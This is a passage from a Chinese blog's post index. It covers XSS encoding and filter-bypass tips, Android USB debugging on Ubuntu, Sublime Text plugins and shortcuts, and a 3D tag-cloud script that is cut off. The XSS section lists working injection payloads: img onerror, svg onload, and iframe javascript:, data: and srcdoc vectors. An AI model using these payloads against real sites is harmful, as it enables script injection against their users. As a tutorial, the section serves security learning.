id=\"CSS编码\"><strong>CSS编码</strong></h3><p>用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\\65”或“65”或“00065”</p>\n<h3 id=\"复合编码\"><strong>复合编码</strong></h3><p>所谓复合编码，也就是说输出的内容输出在多个环境中，例如<br><code>&lt;td onclick=”openUrl(add.do?userName=’&lt;%=value%&gt;’);”&gt;11&lt;/td&gt;</code><br>value的内容首先出现在一个URL中，这个URL在一段javascript中，而javascript代码又是html的一部分。所以解码的顺序就是HTML解码–&gt;js解码–&gt;url解码，那么正确的编码顺序就应该是url编码–&gt;js编码–&gt;html编码。</p>\n<h2 id=\"绕过技巧\"><strong>绕过技巧</strong></h2><ul>\n<li>首先什么都没过滤的情况，那就直接插入<code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>,但是推荐使用img标签，即<code>&lt;img src=1 onerror=alert(1)&gt;</code>或者svg标签<code>&lt;svg/onload=alert(1)&gt;</code>这种方式，因为在Dom型XSS中，innerHTML里面不能以<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>方式来触发</li>\n<li>输出在一堆JS代码中，则要构造语句，闭合JS代码，使得JS代码能够正常执行，否则无法触发XSS。如果exp在页面中有两处以上回显，可以使用如下类型的构造思路:<code>&lt;/script&gt;&lt;script&gt;...exp...</code>,在页面中就会有形如<code>&lt;/script&gt;&lt;script&gt;...exp......&lt;/script&gt;&lt;script&gt;...exp...</code>的输出.</li>\n<li>宽字节：页面编码为gb2312，用%c0吃掉被过滤的引号即%5c，这里原理同宽字节注入。</li>\n<li>反斜线：利用反斜线过滤引号，但是还是要把剩下的闭合好。</li>\n<li>换行符：<code>%0a</code>主要用于exp出现在了代码注释中。注：在javascript中可以用<code>\\</code>连接被换行的一个字符串。</li>\n</ul>\n<h2 id=\"关于iframe标签\"><strong>关于iframe标签</strong></h2><ul>\n<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>\n<li>src执行js：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>\n<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>\n<li>chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code></li>\n<li>chrome下的srcdoc属性：<code>&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;script&gt;&quot;&gt;&lt;/iframe&gt;</code></li>\n</ul>\n<h2 id=\"参考文章\"><strong>参考文章</strong></h2><ul>\n<li><a href=\"http://www.freebuf.com/articles/web/43285.html\" target=\"_blank\" rel=\"external\">XSS编码剖析</a></li>\n</ul>\n"},{"title":"Android在ubuntu下真机调试","url":"http://ohroot.com/2014/09/21/Android在ubuntu下真机调试/","content":"<p>ubuntu环境下，配合eclipse我们可以欢快的进行android编程，但是有时候我们需要真机调试程序，本文将讲述如何配置ubuntu，使得我们可以真机调试android程序。<br><a id=\"more\"></a><br>写在前面，首先讲下Ubuntu环境下Android开发搭建，我主要参考了两篇文章，写的非常好，推荐下：<a href=\"http://dawndiy.com/archives/155/\" target=\"_blank\" rel=\"external\">Linux 下安装配置 JDK7</a>和<a href=\"http://dawndiy.com/archives/153/\" target=\"_blank\" rel=\"external\">Ubuntu 下搭建 Android 开发环境(图文)</a></p>\n<ol>\n<li>将测试机和开发机通过usb连接 </li>\n<li>通过命令查看usb连接情况: <code>lsusb</code>,此命令会将当前usb连接情况展示出来,这里贴出一行示例：<br> <code>Bus 006 Device 002: ID 17ef:6019 Lenovo</code></li>\n<li>查找你的手机所连接端口的ID,如上例即为:<code>17ef</code></li>\n<li>创建android真机的usb规则<br> <code>sudo gedit /etc/udev/rules.d/android.rules</code><br> 以上面联想为例，ID为17ef，输入下面这一行<br> <code>SUBSYSTEM==&quot;usb&quot;, SYSFS{idVendor}==&quot;17ef&quot;, MODE=&quot;0666&quot;</code></li>\n<li>改变文件权限，并重启usb服务<br> <code>sudo chmod a+rx /etc/udev/rules.d/android.rules</code><br> 重启 <code>sudo /etc/init.d/udev restart</code></li>\n<li>重启adb服务,此步骤不能执行则检查adb命令是否在环境变量中<br> <code>sudo adb kill-server</code></li>\n<li><code>sudo adb devices</code>  查看是否配置成功，成功将显示出设备号<br> 下面在手机应用程序中的开发者选项上打开开发者模式即可进行Android真机调试。 </li>\n</ol>\n"},{"title":"sublime使用","url":"http://ohroot.com/2014/09/21/sublime使用/","content":"<p>关于sublime的使用，网上教程五花八门，非常详细，自己整理些常用的把，陆续更新。<br><a id=\"more\"></a></p>\n<p>这里还是先说sublime Text 2 吧，我sublime text 3 不知咋的用着很蛋疼。ubuntu下首先要解决中文输入的问题。这个问题我参考了，<a href=\"http://my.oschina.net/daleyjh/blog/151457\" target=\"_blank\" rel=\"external\">http://my.oschina.net/daleyjh/blog/151457</a>.</p>\n<p>sublime 2 按上述文章描述设置后可以直接输入法图标跟随，sublime则不行，听说可以装个IMEsupport插件来解决，但是，貌似我没搞定。</p>\n<h2 id=\"下面开始安装插件。\">下面开始安装插件。</h2><h3 id=\"Step1_Packet_Control\">Step1 Packet Control</h3><p>通过快捷键 ctrl+` 或者 View &gt; Show Console 菜单打开控制台</p>\n<p>适用于 Sublime Text 3：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.request,os;pf=<span class=\"string\">'Package Control.sublime-package'</span>;ipp=sublime.installed_packages_path();urllib.request.install_opener(urllib.request.build_opener(urllib.request.ProxyHandler()));open(os.path.join(ipp,pf),<span class=\"string\">'wb'</span>).write(urllib.request.urlopen(<span class=\"string\">'http://sublime.wbond.net/'</span>+pf.replace(<span class=\"string\">' '</span>,<span class=\"string\">'%20'</span>)).read())</span><br></pre></td></tr></table></figure></p>\n<p>适用于 Sublime Text 2：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib2,os;pf=<span class=\"string\">'Package Control.sublime-package'</span>;ipp=sublime.installed_packages_path();os.makedirs(ipp) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(ipp) <span class=\"keyword\">else</span> <span class=\"keyword\">None</span>;open(os.path.join(ipp,pf),<span class=\"string\">'wb'</span>).write(urllib2.urlopen(<span class=\"string\">'http://sublime.wbond.net/'</span>+pf.replace(<span class=\"string\">' '</span>,<span class=\"string\">'%20'</span>)).read())</span><br></pre></td></tr></table></figure></p>\n<p>发现别人总结的不错，推荐一篇文章<a href=\"http://www.cnblogs.com/figure9/p/sublime-text-complete-guide.html\" target=\"_blank\" rel=\"external\">Sublime Text 全程指引</a></p>\n<h2 id=\"我的常用插件\">我的常用插件</h2><ul>\n<li>IMESupport 解决输入法跟随</li>\n<li>All Autocomplete 自动补全</li>\n<li>ConvertToUTF8</li>\n<li>DocBlocker 代码注释</li>\n<li>Emmet</li>\n<li>JsFormat 快捷键<code>Ctrl + Alt + F</code></li>\n<li>HTMLBeautify，HTML/Css/JavaScript 代码格式化</li>\n<li>SublimeCodeIntel</li>\n<li>HTML/CSS/JS Prettify 需要安装node.js 快捷键<code>Ctrl+Shift+H</code></li>\n</ul>\n<h2 id=\"一些快捷键\">一些快捷键</h2><ul>\n<li><p>文件跳转 <code>Ctrl + P</code></p>\n</li>\n<li><p><code>Ctrl + Enter</code>在当前行下面新增一行然后跳至该行；<code>Ctrl + Shift + Enter</code>在当前行上面增加一行并跳至该行。</p>\n</li>\n<li>块编辑：<code>Ctrl + D</code> 按段选择，<code>Ctrl + Shift + L</code>可以将当前选中区域打散，然后进行同时编辑，<code>Ctrl + J</code>可以把当前选中区域合并为一行。</li>\n<li>跳转到符号 <code>Ctrl + R</code>,<code>F12</code>快速跳转到当前光标所在符号的定义处,对于Markdown，<code>Ctrl + R</code>会列出其大纲.</li>\n<li>跳转到某行: <code>Ctrl + G</code>然后输入行号以跳转到指定行</li>\n</ul>\n"},{"title":"为博客添加3D标签云","url":"http://ohroot.com/2014/09/19/tagscloud/","content":"<p>看到别人博客的标签云，羡慕的很啊，必须搞一个。<br><a id=\"more\"></a><br>看到别人博客的标签云，羡慕的很啊，必须搞一个，于是找来了相关代码来修改<br>核心js代码如下：<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> radius = <span class=\"number\">90</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> dtr = <span class=\"built_in\">Math</span>.PI / <span class=\"number\">180</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> d = <span class=\"number\">300</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> mcList = [];</span><br><span class=\"line\"><span class=\"keyword\">var</span> active = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> lasta = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> lastb = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> distr = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> tspeed = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> size = <span class=\"number\">250</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> mouseX = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> mouseY = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> howElliptical = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> aA = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> oDiv = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">window</span>.onload = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> oTag = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\toDiv = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'newstags'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\taA = oDiv.getElementsByTagName(<span class=\"string\">'a'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; aA.length; i++) &#123;</span><br><span class=\"line\">\t\toTag = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\toTag.offsetWidth = aA[i].offsetWidth;</span><br><span class=\"line\">\t\toTag.offsetHeight = aA[i].offsetHeight;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmcList.push(oTag);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsineCosine(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpositionAll();</span><br><span class=\"line\"></span><br><span class=\"line\">\toDiv.onmouseover = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\tactive = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\toDiv.onmouseout = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\tactive = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\toDiv.onmousemove = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(ev)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> oEvent = <span class=\"built_in\">window</span>.event || ev;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmouseX = oEvent.clientX - (oDiv.offsetLeft + oDiv.offsetWidth / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tmouseY = oEvent.clientY - (oDiv.offsetTop + oDiv.offsetHeight / <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmouseX /= <span class=\"number\">5</span>;</span><br><span class=\"line\">\t\tmouseY /= <span class=\"number\">5</span>;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsetInterval(update, <span class=\"number\">30</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> a;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> b;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (active) &#123;</span><br><span class=\"line\">\t\ta = (-<span class=\"built_in\">Math</span>.min(<span class=\"built_in\">Math</span>.max(-mouseY, -size), size) / radius) * tspeed;</span><br><span class=\"line\">\t\tb = (<span class=\"built_in\">Math</span>.min(<span class=\"built_in\">Math</span>.max(-mouseX, -size), size) / radius) * tspeed;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\ta = lasta * <span class=\"number\">0.98</span>;</span><br><span class=\"line\">\t\tb = lastb * <span class=\"number\">0.98</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlasta = a;</span><br><span class=\"line\">\tlastb = b;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">Math</span>.abs(a) &lt;= <span class=\"number\">0.01</span> &amp;&amp; <span class=\"built_in\">Math</span>.abs(b) &lt;= <span class=\"number\">0.01</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> c = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tsineCosine(a, b, c);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> j = <span class=\"number\">0</span>; j &lt; mcList.length; j++) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> rx1 = mcList[j].cx;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> ry1 = mcList[j].cy * ca + mcList[j].cz * (-sa);</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> rz1 = mcList[j].cy * sa + mcList[j].cz * ca;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> rx2 = rx1 * cb + rz1 * sb;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> ry2 = ry1;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> rz2 = rx1 * (-sb) + rz1 * cb;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> rx3 = rx2 * cc + ry2 * (-sc);</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> ry3 = rx2 * sc + ry2 * cc;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> rz3 = rz2;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmcList[j].cx = rx3;</span><br><span class=\"line\">\t\tmcList[j].cy = ry3;</span><br><span class=\"line\">\t\tmcList[j].cz = rz3;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tper = d / (d + rz3);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmcList[j].x = (howElliptical * rx3 * per) - (howElliptical * <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tmcList[j].y = ry3 * per;</span><br><span class=\"line\">\t\tmcList[j].scale = per;</span><br><span class=\"line\">\t\tmcList[j].alpha = per;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmcList[j].alpha = (mcList[j].alpha - <span class=\"number\">0.6</span>) * (<span class=\"number\">10</span> / <span class=\"number\">6</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdoPosition();</span><br><span class=\"line\">\tdepthSort();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">depthSort</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> aTmp = [];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; aA.length; i++) &#123;</span><br><span class=\"line\">\t\taTmp.push(aA[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\taTmp.sort(</span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(vItem1, vItem2)</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (vItem1.cz &gt; vItem2.cz) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vItem1.cz &lt; vItem2.cz) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; aTmp.length; i++) &#123;</span><br><span class=\"line\">\t\taTmp[i].style.zIndex = i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">positionAll</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> phi = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> theta = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> max = mcList.length;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> aTmp = [];</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> oFragment = <span class=\"built_in\">document</span>.createDocumentFragment();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//Ëæ»úÅÅÐò</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; aA.length; i++) &#123;</span><br><span class=\"line\">\t\taTmp.push(aA[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\taTmp.sort(</span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.random() &lt; <span class=\"number\">0.5</span> ? <span class=\"number\">1</span> : -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; aTmp.length; i++) &#123;</span><br><span class=\"line\">\t\toFragment.appendChild(aTmp[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\toDiv.appendChild(oFragment);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">1</span>; i &lt; max + <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (distr) &#123;</span><br><span class=\"line\">\t\t\tphi = <span class=\"built_in\">Math</span>.acos(-<span class=\"number\">1</span> + (<span class=\"number\">2</span> * i - <span class=\"number\">1</span>) / max);</span><br><span class=\"line\">\t\t\ttheta = <span class=\"built_in\">Math</span>.sqrt(max * <span class=\"built_in\">Math</span>.PI) * phi;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tphi = <span class=\"built_in\">Math</span>.random() * (<span class=\"built_in\">Math</span>.PI);</span><br><span class=\"line\">\t\t\ttheta = <span class=\"built_in\">Math</span>.random() * (<span class=\"number\">2</span> * <span class=\"built_in\">Math</span>.PI);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//×ø±ê±ä»»</span></span><br><span class=\"line\">\t\tmcList[i - <span class=\"number\">1</span>].cx = radius * <span class=\"built_in\">Math</span>.cos(theta) * <span class=\"built_in\">Math</span>.sin(phi);</span><br><span class=\"line\">\t\tmcList[i - <span class=\"number\">1</span>].cy = radius * <span class=\"built_in\">Math</span>.sin(theta) * <span class=\"built_in\">Math</span>.sin(phi);</span><br><span class=\"line\">\t\tmcList[i - <span class=\"number\">1</span>].cz = radius * <span class=\"built_in\">Math</span>.cos(phi);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\taA[i - <span class=\"number\">1</span>].style.left = mcList[i - <span class=\"number\">1</span>].cx + oDiv.offsetWidth / <span class=\"number\">2</span> - mcList[i - <span class=\"number\">1</span>].offsetWidth / <span class=\"number\">2</span> + <span class=\"string\">'px'</span>;</span><br><span class=\"line\">\t\taA[i - <span class=\"number\">1</span>].style.top = mcList[i - <span class=\"number\">1</span>].cy + oDiv.offsetHeight / <span class=\"number\">2</span> - mcList[i - <span class=\"number\">1</span>].offsetHeight / <span class=\"number\">2</span> + <span class=\"string\">'px'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doPosition</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> l = oDiv.offsetWidth / <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> t = oDiv.offsetHeight / <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; mcList.length; i++) &#123;</span><br><span class=\"line\">\t\taA[i].style.left = mcList[i].cx + l - mcList[i].offsetWidth / <span class=\"number\">2</span> + <span class=\"string\">'px'</span>;</span><br><span class=\"line\">\t\taA[i].style.top = mcList[i].cy + t - mcList[i].offsetHeight / <span class=\"number\">2</span> + <span class=\"string\">'px'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\taA[i].style.fontSize = <span class=\"built_in\">Math</span>.ceil(<span class=\"number\">12</span> * mcList[i].scale / <span class=\"number\">2</span>) + <span class=\"number\">8</span> + <span class=\"string\">'px'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\taA[i].style.filter = <span class=\"string\">\"alpha(opacity=\"</span> + <span class=\"number\">100</span> * mcList[i].alpha + <span class=\"string\">\")\"</span>;</span><br><span class=\"line\">\t\taA[i].style.opacity = mcList[i].alpha;</span><br><span 